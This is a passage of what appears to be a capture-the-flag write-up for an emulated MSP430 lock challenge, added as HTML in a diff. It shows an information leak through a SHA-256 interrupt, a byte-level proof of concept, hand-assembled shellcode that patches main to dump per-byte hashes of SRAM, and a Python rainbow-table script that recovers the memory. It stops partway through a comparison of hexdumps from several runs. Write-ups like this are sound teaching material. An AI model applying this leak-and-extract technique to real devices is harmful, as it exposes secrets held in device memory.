+               │R15│0002│                │R15+R14│000e│
+               └───┼────┘                └───────┼────┘
+                   │                             │
+                   ▼                             ▼
+┌────┬────────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐
+│    │CONTENTS│AAAA│<mark>BBBB│CCCC│DDDD│EEEE│FFFF│1111</mark>│2222│3333│
+│SRAM├────────┼────┼────┼────┼────┼────┼────┼────┼────┼────┤
+│    │ADDRESS │0000│0002│0004│0006│0008│000a│000c│000e│0010│
+└────┴────────┴────┴────┴────┴────┴────┴────┴────┴────┴────┘
+</code></pre>
+
+<p>It makes no sense to have a length of zero (the default value passed in <code>R15</code> by <code>main</code>), which implies that <code>R14</code> is the length and <code>R15</code> is the start offset. If <code>R14</code> contains the value 0x1000, that suggests SRAM is 4096 (0x1000) bytes long.</p>
+
+<pre><code class='language-ascii-noshadows'>                                                      ┌───┬────┐
+                                                      │R14│1000│
+                                                      └───┴────┘
+
+          ┌───┬────┐                              ┌───────┬────┐
+          │R15│0000│                              │R15+R14│1000│
+          └───┼────┘                              └───────┼────┘
+              │                                           │
+              ▼                                           ▼
+┌────┬────────┬────┬────┬────┬────┬───┬────┬────┬────┬────┐
+│    │CONTENTS│<mark>1111│2222│3333│4444│...│0000│0000│0000│0000</mark>│
+│SRAM├────────┼────┼────┼────┼────┼───┼────┼────┼────┼────┤
+│    │ADDRESS │0000│0002│0004│0006│...│0FFC│0FFD│0FFE│0FFF│
+└────┴────────┴────┴────┴────┴────┴───┴────┴────┴────┴────┘
+</code></pre>
+
+<p>Such a calling convention implies the existence of an information leak vulnerability: if it is possible to specify any start offset and a length of 0x1, the interrupt should return the SHA256 checksum of a single word—or possibly even a single byte.</p>
+
+
+<pre><code class='language-ascii-noshadows'>                         ┌───┬────┐
+                         │R14│0001│
+                         └───┴────┘
+
+          ┌───┬────┐ ┌───────┬────┐
+          │R15│0000│ │R15+R14│0001│
+          └───┼────┘ └───────┼────┘
+              │              │
+              │              │
+              │    ┌─────────┘
+              ▼    ▼
+┌────┬────────┬────┬────┬────┬────┬────┬───┬────┬────┬────┬────┐
+│    │CONTENTS│ <mark>11</mark> │ 11 │2222│3333│4444│...│0000│0000│0000│0000│
+│SRAM├────────┼────┼────┼────┼────┼────┼───┼────┼────┼────┼────┤
+│    │ADDRESS │0000│0001│0002│0004│0006│...│0FFC│0FFD│0FFE│0FFF│
+└────┴────────┴────┴────┴────┴────┴────┴───┴────┴────┴────┴────┘
+</code></pre>
+
+<p>It is then possible to run all 256 possible individual bytes through sha256 to find which one produced the hash.</p>  
+
+<h3>Proof Of Concept</h3> 
+<p>Verifying the vulnerability is simple: because any given memory space will generally have many nulls, choosing a random start offset in high memory will likely return the hash of a single null byte. Take a case where <code>R15</code> is 0x800 and <code>R14</code> is 0x1.</p>
+
+<h5>High Memory Start Offset:</h5>
+
+<pre><code class='language-ascii-noshadows'>                                  ┌───┬────┐
+                                  │R14│0001│
+                                  └───┴────┘
+
+                   ┌───┬────┐ ┌───────┬────┐
+                   │R15│0800│ │R15+R14│0801│
+                   └───┼────┘ └───────┼────┘
+                       │              │
+                       │              │
+                       │    ┌─────────┘
+                       ▼    ▼
+┌────┬────────┬───┬────┬────┬────┬────┬───┐
+│    │CONTENTS│...│0000│ <mark>00</mark> │ 00 │0000│...│
+│SRAM├────────┼───┼────┼────┼────┼────┼───┤
+│    │ADDRESS │...│07FE│0800│0801│0802│...│
+└────┴────────┴───┴────┴────┴────┴────┴───┘
+</code></pre>
+
+<p>Given these parameters, the I/O console will probably print the hash for a single null byte.</p>
+
+<h5>Resulting Hash:</h5>
+
+<pre><code>Internal SRAM Hash:
+6E340B9CFFB37A989CA544E6BB780A2C78901D3FB33738768511A30617AFA01D
+</code></pre>
+
+<h5>Known Preimage:</h5>
+
+<p>The sha256 hash of a single null byte can be calculated in Python using the following code.</p>
+
+<pre><code>python3 -i
+&gt;&gt;&gt; import hashlib
+&gt;&gt;&gt; import binascii
+&gt;&gt;&gt; binascii.hexlify(hashlib.sha256(b'\x<mark>00</mark>').digest())
+b'6e340b9cffb37a989ca544e6bb780a2c78901d3fb33738768511a30617afa01d'
+</code></pre>
+
+<p>The known hash for a single null byte matches the one printed to the I/O console, confirming that the byte at offset 0x800 in SRAM is 0x00 and that it is possible to checksum individual bytes. The information leak vulnerability exists and is exploitable.</p>
+
+<h5>A note on the workings of hashing algorithms:</h5>
+<p>It may not be immediately clear why this proves it is possible to leak <em>individual byte values</em> rather than words. To illustrate why this is so, consider the following Python code.</p>
+
+<pre><code>&gt;&gt;&gt; import hashlib
+&gt;&gt;&gt; import binascii
+&gt;&gt;&gt; binascii.hexlify(hashlib.sha256(b'<mark>\x00\x00</mark>').digest())
+b'96a296d224f285c67bee93c30f8a309157f0daa35dc5b87e410b78630a09cfc7'
+</code></pre>
+
+<p>Passing a single null byte through a hashing algorithm produces a different output than doing the same with two null bytes. Given an algorithm resistant to collisions (like SHA256), a matching checksum implies that the hashing operation occurs on a single null byte rather than a null word.</p>
+
+</code></pre>
+
+
+<h2>Exploit Weaponization</h2> 
+<p>While it is convenient to single step and manually edit register values to leak individual bytes, a more efficient technique is required to extract the entire contents of SRAM. There is already existing code in memory to call <code>sha256_internal</code> and print the resulting hash to the I/O console.</p>
+
+<br>
+<hr>
+
+      <figure>
+        <img src="./images/halifax-sha256-print.png"
+          loading="lazy" alt="Loop that prints the SHA256 hash to the I/O console." />
+      </figure>
+      <hr>
+
+<p>All that is required is some payload code to patch in an unconditional branch in the middle of the <code>main</code> function, set the values for <code>R13</code>, <code>R14</code>, and <code>R15</code>, and branch to address <code>0x44a6</code> (right before the call to <code>sha256_internalM</code>). This code will run in a loop, printing the hash for every byte in SRAM. An improvised "data section" is also necessary to store a counter used as the offset passed in <code>R15</code> with each iteration.</p>
+
+
+
+      <h3>Functionality Breakdown</h3>
+
+      <p>The payload would be a while loop if implemented in a higher-level language. The first instruction is responsible for jumping over the data section:</p>
+
+<pre><code class='language-ascii-noshadows'><xmp>┌──┐  ┌────────────────────┐
+│PC├─►│jmp     $+0x32      ├───┐
+└──┘  ├────────────────────┤   │
+      │                    │   │
+      │        DATA        │   │JUMP
+      │                    │   │
+      ├────────────────────┤   │
+      │mov     #0x8002, r4 │◄──┘
+      ├────────────────────┤
+      │mov     @r4, &0x44ee│        
+      ├────────────────────┤
+      │incd    r4          │
+      ├────────────────────┤
+      │mov     @r4, &0x44f0│
+      ├────────────────────┤
+      │mov     sp, r13     │
+      ├────────────────────┤
+      │mov     #0x1, r14   │
+      ├────────────────────┤
+      │mov     &0x8006, r15│
+      ├────────────────────┤
+      │inc     r15         │
+      ├────────────────────┤
+      │mov     r15, &0x8006│
+      ├────────────────────┤
+      │mov     &0x8008, r6 │
+      ├────────────────────┤
+      │cmp     r6, r15     │
+      ├────────────────────┤
+      │jz      $+0x6       │
+      ├────────────────────┤
+      │br      #0x44a6     │
+      └────────────────────┘
+</xmp></code></pre>
+
+<p>Following this are two writes to patch in a branch instruction after the end of the loop that prints the SRAM hash. When executed later, this patched opcode causes execution to jump back to the start of the payload.</p>
+
+<pre><code class='language-ascii-noshadows'><xmp>       ┌────────────────────┐
+       │jmp     $+0x32      │
+       ├────────────────────┤
+       │                    │
+       │        DATA        │
+       │                    │
+       ├────────────────────┤
+       │mov     #0x8002, r4 │
+┌───┐  ├────────────────────┤PATCH¹
+│PC¹├─►│mov     @r4, &0x44ee├──────┐
+└───┘  ├────────────────────┤      │
+       │incd    r4          │      │
+┌───┐  ├────────────────────┤PATCH²│
+│PC²├─►│mov     @r4, &0x44f0├──────┤
+└───┘  ├────────────────────┤      │WRITES
+       │mov     sp, r13     │      │OPCODE
+       ├────────────────────┤      ▼
+       │mov     #0x1, r14   │ ┌──────────┐
+       ├────────────────────┤ │br #0x8000│
+       │mov     &0x8006, r15│ └────┬─────┘
+       ├────────────────────┤      │TO
+       │inc     r15         │      │
+       ├────────────────────┤      │
+       │mov     r15, &0x8006│      │
+       ├────────────────────┤      │
+       │mov     &0x8008, r6 │      │
+       ├────────────────────┤      │
+       │cmp     r6, r15     │      │
+       ├────────────────────┤      │
+       │jz      $+0x6       │      │
+       ├────────────────────┤      │
+       │br      #0x44a6     │      │
+       └────────────────────┘      │
+                                   │
+     ┌─────────────────────────────┘
+     │
+     │ ┌──────────────────────────────────────────────────┐
+     │ │and	#0xf, r14                                 │
+     │ ├──────────────────────────────────────────────────┤
+     │ │mov.b	0x4710(r14), r15                          │
+     │ ├──────────────────────────────────────────────────┤
+     │ │call    #0x4578 <putchar>                         │
+     │ ├──────────────────────────────────────────────────┤
+     │ │mov.b   r10, r15                                  │
+     │ ├──────────────────────────────────────────────────┤
+     │ │call    #0x4578 <putchar>                         │
+     │ ├──────────────────────────────────────────────────┤
+     │ │inc     r11                                       │
+     │ ├──────────────────────────────────────────────────┤
+     │ │cmp     #0x20, r11                                │
+     │ ├──────────────────────────────────────────────────┤
+     │ │jnz     $-0x38 <main+0x6e>                        │
+     │ ├──────────────────────────────────────────────────┤
+     │ │mov     #0x4721, r15                              │
+     │ ├──────────────────────────────────────────────────┤
+     │ │call    #0x4586 <puts>                            │
+     │ ├──────────────────────────────────────────────────┤
+     └►│mov     #0x4722 "Please enter debug payload.", r15│
+       ├──────────────────────────────────────────────────┤
+       │call    #0x4586 <puts>                            │
+       ├──────────────────────────────────────────────────┤
+       │mov     #0x400, r13                               │
+       ├──────────────────────────────────────────────────┤
+       │clr     r14                                       │
+       ├──────────────────────────────────────────────────┤
+       │mov     #0x2400, r15                              │
+       ├──────────────────────────────────────────────────┤
+       │call    #0x45c8 <memset>                          │
+       └──────────────────────────────────────────────────┘
+
+</xmp></code></pre>
+
+
+<p>The parameters for the call to <code>sha256_internal</code> come next:</p>
+
+<pre><code class='language-ascii-noshadows'>      ┌────────────────────┐
+      │mov     #0x8002, r4 │
+      ├────────────────────┤
+      │mov     @r4, &amp;0x44ee│
+      ├────────────────────┤
+      │incd    r4          │
+      ├────────────────────┤
+      │mov     @r4, &amp;0x44f0│
+      ├────────────────────┤
+      │<mark>mov     sp, r13</mark>     │
+┌──┐  ├────────────────────┤
+│PC├─►│<mark>mov     #0x1, r14</mark>   │
+└──┘  ├────────────────────┤
+      │mov     &amp;0x8006, r15│
+      ├────────────────────┤
+      │inc     r15         │
+      ├────────────────────┤
+      │mov     r15, &amp;0x8006│
+      ├────────────────────┤
+      │mov     &amp;0x8008, r6 │
+      ├────────────────────┤
+      │cmp     r6, r15     │
+      ├────────────────────┤
+      │jz      $+0x6       │
+      ├────────────────────┤
+      │br      #0x44a6     │
+      └────────────────────┘
+
+</code></pre>
+
+<p>The value at <code>0x8006</code> is the counter variable that contains the start offset SRAM section to hash for each iteration.</p>
+
+<pre><code class='language-ascii-noshadows'>       ┌────────────────────┐      ┌──────┐
+       │mov     #0x8002, r4 │      │      │
+       ├────────────────────┤      │ DATA │
+       │mov     @r4, &amp;0x44ee│      │      │
+       ├────────────────────┤      ├──────┤
+       │incd    r4          │      │ 3040 │
+       ├────────────────────┤      ├──────┤      ┌────┐           ┌────┐
+       │mov     @r4, &amp;0x44f0│      │ 0080 │      │R15:│           │R15:│
+       ├────────────────────┤      ├──────┤ LOAD¹├────┤ INCREMENT²├────┤
+       │mov     sp, r13     │    ┌►│ FFFF ├─────►│FFFF├──────────►│0000│
+       ├────────────────────┤    │ ├──────┤      └────┘           └─┬──┘
+       │mov     #0x1, r14   │    │ │ 0010 │                         │
+┌───┐  ├────────────────────┤    │ ├──────┤                         │
+│PC¹├─►│<mark>mov     &amp;0x8006, r15</mark>│    │ │ .... │                         │
+├───┤  ├────────────────────┤    │ ├──────┤                         │
+│PC²├─►│<mark>inc     r15</mark>         │    │ │ .... │                         │
+├───┤  ├────────────────────┤    │ └──────┘                         │
+│PC³├─►│<mark>mov     r15, &amp;0x8006</mark>│    │               STORE³             │
+└───┘  ├────────────────────┤    └──────────────────────────────────┘
+       │mov     &amp;0x8008, r6 │
+       ├────────────────────┤
+       │cmp     r6, r15     │
+       ├────────────────────┤
+       │jz      $+0x6       │
+       ├────────────────────┤
+       │br      #0x44a6     │
+       └────────────────────┘
+</code></pre>
+
+<p>Every iteration of this loop will increment it by one. This counter starts containing 0xFFFF, or -0x1 if interpreted as a signed integer. The first iteration of this loop will increment it, causing a deliberate integer overflow that wraps around to address 0x0000. The next instruction updates the word at address <code>0x8006</code> (in the data section) with the new value.</p>
+
+<p>It will be 0x0001 on the next iteration, then 0x0002, etcetera.</p>
+
+<h5>i = 1</h5>
+<pre><code class='language-ascii-noshadows'>  ┌──────┐
+  │      │
+  │ DATA │
+  │      │
+  ├──────┤
+  │ 3040 │
+  ├──────┤      ┌────┐           ┌────┐
+  │ 0080 │      │R15:│           │R15:│
+  ├──────┤ LOAD¹├────┤ INCREMENT²├────┤
+┌►│ 0000 ├─────►│0000├──────────►│<mark>0001</mark>│
+│ ├──────┤      └────┘           └─┬──┘
+│ │ 0010 │                         │
+│ ├──────┤                         │
+│ │ .... │                         │
+│ ├──────┤                         │
+│ │ .... │                         │
+│ └──────┘                         │
+│               STORE³             │
+└──────────────────────────────────┘
+</code></pre>
+
+<h5>i = 2</h5>
+<pre><code class='language-ascii-noshadows'>  ┌──────┐
+  │      │
+  │ DATA │
+  │      │
+  ├──────┤
+  │ 3040 │
+  ├──────┤      ┌────┐           ┌────┐
+  │ 0080 │      │R15:│           │R15:│
+  ├──────┤ LOAD¹├────┤ INCREMENT²├────┤
+┌►│ 0001 ├─────►│0001├──────────►│<mark>0002</mark>│
+│ ├──────┤      └────┘           └─┬──┘
+│ │ 0010 │                         │
+│ ├──────┤                         │
+│ │ .... │                         │
+│ ├──────┤                         │
+│ │ .... │                         │
+│ └──────┘                         │
+│               STORE³             │
+└──────────────────────────────────┘
+</code></pre>
+
+<p>The last item of importance is the termination condition. This loop will run past the end of SRAM and cause the processor to halt with the <code>"Exceeded SRAM length"</code> error. While this is not problematic for this version, it will be necessary to avoid this when extending the payload with more code later.</p>
+
+<p>The SRAM is 4096 bytes long (0x1000 in hex). One of the words in the data section stores this value, and the payload code compares it to the current offset after every iteration. If the current offset is 0x1000, the code deliberately jumps into null memory and crashes the MCU.</p>
+
+<pre><code class='language-ascii-noshadows'>       ┌────────────────────┐        ┌──────┐
+       │mov     #0x8002, r4 │        │      │
+       ├────────────────────┤        │ DATA │
+       │mov     @r4, &amp;0x44ee│        │      │
+       ├────────────────────┤        ├──────┤
+       │incd    r4          │        │ 3040 │
+       ├────────────────────┤        ├──────┤
+       │mov     @r4, &amp;0x44f0│        │ 0080 │
+       ├────────────────────┤        ├──────┤      ┌────┐
+       │mov     sp, r13     │        │ FFFF │      │R6: │
+       ├────────────────────┤        ├──────┤ LOAD¹├────┤
+       │mov     #0x1, r14   │        │ 0010 ├─────►│1000│
+       ├────────────────────┤        ├──────┤      └─┬──┘
+       │mov     &amp;0x8006, r15│        │ .... │        │
+       ├────────────────────┤        ├──────┤        │
+       │inc     r15         │        │ .... │        │
+       ├────────────────────┤        └──────┘        │
+       │mov     r15, &amp;0x8006│                        │
+┌───┐  ├────────────────────┤        ┌─────────────┐ │
+│PC¹├─►│<mark>mov     &amp;0x8008, r6</mark> │        │   COMPARE²  │ │
+├───┤  ├────────────────────┤        ├─────────────┤ │
+│PC²├─►│<mark>cmp     r6, r15</mark>     │        │             │ │
+├───┤  ├────────────────────┤        │ ┌───┐ ┌───┐ │ │
+│PC³├─►│<mark>jz      $+0x6</mark>       ├──────┐ │ │R6 │ │R15│ │◄┘
+└───┘  ├────────────────────┤      │ │ └───┘ └───┘ │
+       │br      #0x44a6     │      │ │             │
+       └────────────────────┘      │ └─────────────┘
+                                   │
+       ┌───────────┐               │
+       │NULL MEMORY│◄──────────────┘
+       └─────┬─────┘  JUMP IF EQUAL³
+             │
+             ▼
+       ┌───────────┐
+       │---CRASH---│
+       └───────────┘
+</code></pre>
+
+<p>If the current offset is not 0x1000, execution branches into the middle of the <code>main</code> function just before the loop that prints the internal SRAM hash. After it prints one hash, execution will reach the branch instruction patched in earlier. This instruction will cause execution to branch back to the start of the shellcode, thus completing one iteration of the loop.</p>
+
+<pre><code class='language-ascii-noshadows'><xmp>
+
+      ┌────────────────────┐
+      │jmp     $+0x32      │◄────────────────────────────┐
+      ├────────────────────┤                             │
+      │                    │                             │
+      │        DATA        │                             │
+      │                    │                             │
+      ├────────────────────┤                             │
+      │mov     #0x8002, r4 │                             │
+      ├────────────────────┤                             │
+      │mov     @r4, &0x44ee│                             │
+      ├────────────────────┤                             │
+      │incd    r4          │                             │
+      ├────────────────────┤                             │
+      │mov     @r4, &0x44f0│                             │
+      ├────────────────────┤                             │
+      │mov     sp, r13     │                             │
+      ├────────────────────┤                             │
+      │mov     #0x1, r14   │                             │
+      ├────────────────────┤                             │
+      │mov     &0x8006, r15│                             │
+      ├────────────────────┤                             │
+      │inc     r15         │                             │
+      ├────────────────────┤                             │
+      │mov     r15, &0x8006│                             │
+      ├────────────────────┤                             │
+      │mov     &0x8008, r6 │                             │
+      ├────────────────────┤                             │
+      │cmp     r6, r15     │                             │
+      ├────────────────────┤                             │
+      │jz      $+0x6       │                             │
+┌──┐  ├────────────────────┤                             │
+│PC├─►│br      #0x44a6     │                             │
+└──┘  └────────┬───────────┘                             │
+               │                                         │
+               │ BRANCH¹                                 │
+               ▼                                         │
+      ┌────┬─────────────────────────────────┐           │
+      │44a6│call    #0x45b6 <sha256_internal>│           │
+      ├────┼─────────────────────────────────┤           │
+      │44aa│clr     r11                      │           │
+      ├────┼─────────────────────────────────┤           │
+      │44ac│mov     sp, r15                  │◄────────┐ │
+      ├────┼─────────────────────────────────┤         │ │
+      │44ae│add     11, r15                  │         │ │
+      ├────┼─────────────────────────────────┤         │ │
+      │....│....                             │         │ │
+      ├────┼─────────────────────────────────┤         │ │
+      │44d4│call    #0x4578 <putchar>        │         │ │
+      ├────┼─────────────────────────────────┤         │ │
+      │44d8│mov.b   r10, r15                 │         │ │
+      ├────┼─────────────────────────────────┤         │ │
+      │44da│call    #0x4578 <putchar>        │         │ │
+      ├────┼─────────────────────────────────┤         │ │
+      │44de│inc     r11                      │         │ │
+      ├────┼─────────────────────────────────┤         │ │
+      │44e0│cmp     #0x20, r11               │ PUTCHAR │ │
+      ├────┼─────────────────────────────────┤ LOOP²   │ │
+      │44e4│jnz     $-0x38 <main+0x6e>       ├─────────┘ │
+      ├────┼─────────────────────────────────┤           │
+      │44e6│mov     #0x4721, r15             │           │
+      ├────┼─────────────────────────────────┤           │
+      │44ea│call    #0x4586 <puts>           │           │
+      ├────┼─────────────────────────────────┤  BRANCH³  │
+      │44ee│br      #0x8000                  ├───────────┘
+      └────┴─────────────────────────────────┘
+
+</xmp></code></pre>
+
+<h5>Payload format:</h5>
+
+</pre></code>
+
+      <table>
+        <caption>Payload Structure</caption>
+        <thead>
+          <tr>
+            <th>Load Address</th>
+            <th>Size (Bytes)</th>
+            <th>Jump over data section</th>
+	    <th>Data section (48 bytes)</th>
+	    <th>Executable code</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+		  <td><code>8000</code></td>
+		  <td><code>ff</code></td>
+		  <td><code>183c</code></td>
+		  <td><code>30400080ffff...</code></td>
+		  <td><code>34400280a244...</code></td>
+          </tr>
+        </tbody>
+      </table>
+
+
+      <p>The size field is 255 (0xFF) for convenience, which causes copying of the null memory after the executable code section to the load address along with it. This quirk does not affect the payload code, so this is acceptable.</p>
+<h5>Data section:</h5>
+
+<p>The data section is defined<label for="sn-1" class="sidenote-toggle sidenote-number"></label>
+
+<input type="checkbox" id="sn-1" class="sidenote-toggle" />
+<span class="sidenote">Note that integers are stored little-endian.</span>
+
+as follows:</p>
+
+<pre><code>3040 0080 ffff 0010
+0000 0000 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+</code></pre>
+<h5>Payload Assembly:</h5>
+
+<pre><code>8000 ff 
+
+183c
+3040 0080 ffff 0010
+0000 0000 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+
+3440 0280 a244 ee44 2453 a244 f044 
+
+0d41
+3e40 0100 
+1f42 0680 
+1f53
+824f 0680
+1642 0880
+0f96
+0224
+3040 a644
+</code></pre>
+      <h4>Results</h4>
+
+      <p>This payload results in the following output at the I/O console:</p>
+
+      <pre><code><xmp>Executing debug payload
+8A331FDDE7032F33A71E1B2E257D80166E348E00FCB17914F48BDB57A1C63007
+3EBE1B59762A1C8020C1EFE3747DD07F0E30617ED60B4E6A5BEE16B6EA421DD0
+3973E022E93220F9212C18D0D0C543AE7C309E46640DA93A4A0314DE999F5112
+A25513C7E0F6EAA80A3337EE18081B9E2ED09E00AF8531C8F7BB2542764027E7
+26E5BFE4B0686167E3E4E0AAC40CBAE03515171D375F91EA563C9C044E9C5CC7
+BA5EC51D07A4AC0E951608704431D59A02B21A4E951ACC10505A8DC407C501EE
+9E8E8C37A53BAC77A653D590B783B2508E8ED2FED040A278BF4F4703BBD5D82D
+27952171C7FCDF0DDC765AB4F4E1C537CB29E5E533D57B3456257EE785C81711
+FFE679BB831C95B67DC17819C63C5090D221AAC6F4C7BF530F594AB43D21FA1E
+04B8D34E20E604CADB04B9DB8F6778C35F45A2D2A3335EA517DAFE8C9CD9B06E
+9BE3799F24592E94E1F7991E5F312648A509CE2FB1EDBAFA50A66B65C916539A
+DC0E9C3658A1A3ED1EC94274D8B19925C93E1ABB7DDBA294923AD9BDE30F8CB8
+2795044CE0F83F718BC79C5F2ADD1E52521978DF91CE9B7F82C9097191D33602
+AA687B58B0E73E2E383F8C500D75B591E188EFE0168B3FFBCD3771CAAA6DD4C7
+478508483CBB05DEFD7DCDAC355DADF06282A6F2E14342CCCBA99E840202F943
+BA5EC51D07A4AC0E951608704431D59A02B21A4E951ACC10505A8DC407C501EE
+AA7225E7D5B0A2552BBB58880B3EC00C286995B801A7AEB69281E76A8B4908DE
+E632B7095B0BF32C260FA4C539E9FD7B852D0DE454E9BE26F24D0D6F91D069D3
+DE2E331D891AE267A7009CB45B4E8830F170E0C937288EA2731A1941C7A53B0D
+FDE502858306C235A3121E42326B53228B7EF4690EEED92A2B2EAFE73C03A3EF
+C00E7F889CFC9216EC818BF2E1682FC6AF0D89939C91776669478CAF27C9727C
+74CD9EF9C7E15F57BDAD73C511462CA65CB674C46C49639C60F1B44650FA1DCB
+62B67E1F685B7FEF51102005DDDD27774BE3FEE38C42965C53AAB035D0B6B221
+E77B9A9AE9E30B0DBDB6F510A264EF9DE781501D7B6B92AE89EB059C5AB743DB
+98722E2EBED8ED3D3652E11E4181F0DCCC1CE7D192D8F1DB370AF8EC4A4E174A
+74E1ADE320C66075468E17CFAB33F41E8E0EACA45EDB6DD7B086C49A358D2A69
+A9F51566BD6705F7EA6AD54BB9DEB449F795582D6529A0E22207B8981233EC58
+74E1ADE320C66075468E17CFAB33F41E8E0EACA45EDB6DD7B086C49A358D2A69
+4FB733BEDB74FEC8D65BEDF056B935189A289E928B3302BEC38A281814DE523A
+8CE86A6AE65D3692E7305E2C58AC62EEBD97D3D943E093F577DA25C36988246B
+26E5BFE4B0686167E3E4E0AAC40CBAE03515171D375F91EA563C9C044E9C5CC7
+8A8DE823D5ED3E12746A62EF169BCF372BE0CA44F0A1236ABC35DF05D96928E1
+2795044CE0F83F718BC79C5F2ADD1E52521978DF91CE9B7F82C9097191D33602
+BA5EC51D07A4AC0E951608704431D59A02B21A4E951ACC10505A8DC407C501EE
+18F5384D58BCB1BBA0BCD9E6A6781D1A6AC2CC280C330ECBAB6CB7931B721552
+9D277175737FB50041E75F641ACF94D10DF9B9721DB8FFFE874AB57F8FFB062E
+2E7D2C03A9507AE265ECF5B5356885A53393A2029D241394997265A1A25AEFC6
+2795044CE0F83F718BC79C5F2ADD1E52521978DF91CE9B7F82C9097191D33602
+19152DDFBA193B5B09FCB80D1BBA5248F36027C06E81670DB5A7146FB654D4EC
+8D36BBB3D6FBF24F38BA020D9CEEEF5D4562F5F26629F66B076FF395C438695E
+7ACE431CB61584CB9B8DC7EC08CF38AC0A2D649660BE86D349FB43108B542FA4
+62B67E1F685B7FEF51102005DDDD27774BE3FEE38C42965C53AAB035D0B6B221
+18AC3E7343F016890C510E93F935261169D9E3F565436429830FAF0934F4F8E4
+74CD9EF9C7E15F57BDAD73C511462CA65CB674C46C49639C60F1B44650FA1DCB
+A1FCE4363854FF888CFF4B8E7875D600C2682390412A8CF79B37D0B11148B0FA
+2D3193691934124461809FB9BC7E671215099FC7D961BFBE31943D40D477C890
+68AA2E2EE5DFF96E3355E6C7EE373E3D6A4E17F75F9518D843709C0C9BC3E3D4
+F4F97C88C409DCF3789B5B518DA3F7D266C488066E97A606E38A150779880735
+27ABDEDDFE8503496ADEB623466CAA47DA5F63ABD2BC6FA19F6CFCB73ECFED70
+18AC3E7343F016890C510E93F935261169D9E3F565436429830FAF0934F4F8E4
+D03502C43D74A30B936740A9517DC4EA2B2AD7168CAA0A774CEFE793CE0B33E7
+189F40034BE7A199F1FA9891668EE3AB6049F82D38C68BE70F596EAB2E1857B7
+FDE502858306C235A3121E42326B53228B7EF4690EEED92A2B2EAFE73C03A3EF
+E52D9C508C502347344D8C07AD91CBD6068AFC75FF6292F062A09CA381C89E71
+2C624232CDD221771294DFBB310ACA000A0DF6AC8B66B696D90EF06FDEFB64A3
+D10B36AA74A59BCF4A88185837F658AFAF3646EFF2BB16C3928D0E9335E945D2
+9DEFB0A9E163278BE0E05AA01B312EC78CFA3726869503385E76E3A4B7950648
+E52D9C508C502347344D8C07AD91CBD6068AFC75FF6292F062A09CA381C89E71
+8A8950F7623663222542C9469C73BE3C4C81BBDF019E2C577590A61F2CE9A157
+966C7C47125C74575A9A1153B799FAF55BE33A04E3D9F98760A3EEAC377103DF
+087D80F7F182DD44F184AA86CA34488853EBCC04F0C60D5294919A466B463831
+5D5C7D20A3AAB9C158F23304DF4BEC3BD9D56C517DB3CAEAA519D4D05624D7A0
+4D4D75D742863AB9656F3D5F76DFF8589C3922E95A24EA6812157FFE4AAA3B6B
+CFAE0D4248F7142F7B17F826CD7A519280E312577690E957830D23DCF35A3FFF
+6E340B9CFFB37A989CA544E6BB780A2C78901D3FB33738768511A30617AFA01D
+6E340B9CFFB37A989CA544E6BB780A2C78901D3FB33738768511A30617AFA01D
+6E340B9CFFB37A989CA544E6BB780A2C78901D3FB33738768511A30617AFA01D
+6E340B9CFFB37A989CA544E6BB780A2C78901D3FB33738768511A30617AFA01D
+6E340B9CFFB37A989CA544E6BB780A2C78901D3FB33738768511A30617AFA01D
+6E340B9CFFB37A989CA544E6BB780A2C78901D3FB33738768511A30617AFA01D
+6E340B9CFFB37A989CA544E6BB780A2C78901D3FB33738768511A30617AFA01D
+6E340B9CFFB37A989CA544E6BB780A2C78901D3FB33738768511A30617AFA01D
+6E340B9CFFB37A989CA544E6BB780A2C78901D3FB33738768511A30617AFA01D
+6E340B9CFFB37A989CA544E6BB780A2C78901D3FB33738768511A30617AFA01D
+6E340B9CFFB37A989CA544E6BB780A2C78901D3FB33738768511A30617AFA01D
+6E340B9CFFB37A989CA544E6BB780A2C78901D3FB33738768511A30617AFA01D
+[...]</xmp></code></pre>
+
+      <p>There are 4096 hashes, but every single one after a certain point is the known hash for the null byte—indicating SRAM contains little data. The above output omits most of the null checksums for brevity.</p>
+
+      <h3>Extracting Data</h3>
+      <p>Deriving the original SRAM contents from the hashes is possible by building a small rainbow table, which can be implemented in Python as follows:</p>
+
+      <pre><code><xmp>import hashlib
+import binascii
+
+table = {}
+
+for i in range(0,256):
+    table[hashlib.sha256((i).to_bytes(1, "big")).hexdigest().upper()] = i.to_bytes(1, "big")
+
+output = b''
+
+for line in open('hashes.txt', 'r'):
+    output += table[line.strip()]
+
+with open("output.bin", "wb") as f:
+    f.write(output)
+
+print(binascii.hexlify(output).decode())</xmp></code></pre>
+
+
+      <p>Pasting the above 4096 hashes into a text file called "hashes.txt" and running the above Python script on it will produce a file called "output.bin" containing the contents of SRAM as raw binary data. Taking a hexdump of this file produces the following output:</p>
+
+<pre><code><xmp>hexdump -C output.bin 
+00000000  22 8b 2d 55 bc 29 a9 b4  1f fb b2 0f dd fe be 29  |".-U.).........)|
+00000010  fa 54 e9 f0 85 5e 3e 05  fc a8 45 a8 c9 4e bc 3f  |.T...^>...E..N.?|
+00000020  dd 29 59 9d 63 dd d9 9b  7e 3e 64 5e 79 8a 19 b0  |.)Y.c...~>d^y...|
+00000030  f5 64 2c 6a f0 04 38 7d  8c 04 a1 f2 ab da ef 5d  |.d,j..8}.......]|
+00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00001000</xmp></code></pre>
+
+<h3>Differential Analysis</h3>
+<p>The fact that the SRAM contents change between runs is apparent from the differing SRAM hashes. The next objective is to determine what is changing. The following snippets are hexdumps of the output from five different runs.</p>
+
+<h5>Run 1:</h5>
+
+<pre><code><xmp>00000000  22 8b 2d 55 bc 29 a9 b4  1f fb b2 0f dd fe be 29  |".-U.).........)|
+00000010  fa 54 e9 f0 85 5e 3e 05  fc a8 45 a8 c9 4e bc 3f  |.T...^>...E..N.?|
+00000020  dd 29 59 9d 63 dd d9 9b  7e 3e 64 5e 79 8a 19 b0  |.)Y.c...~>d^y...|
+00000030  f5 64 2c 6a f0 04 38 7d  8c 04 a1 f2 ab da ef 5d  |.d,j..8}.......]|
+00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00001000
+</xmp></code></pre>
+
+<h5>Run 2:</h5>
+
+<pre><code><xmp>00000000  5c a8 2a 56 21 32 95 f9  e9 e4 38 7b 0f ea fe be  |\.*V!2....8{....|
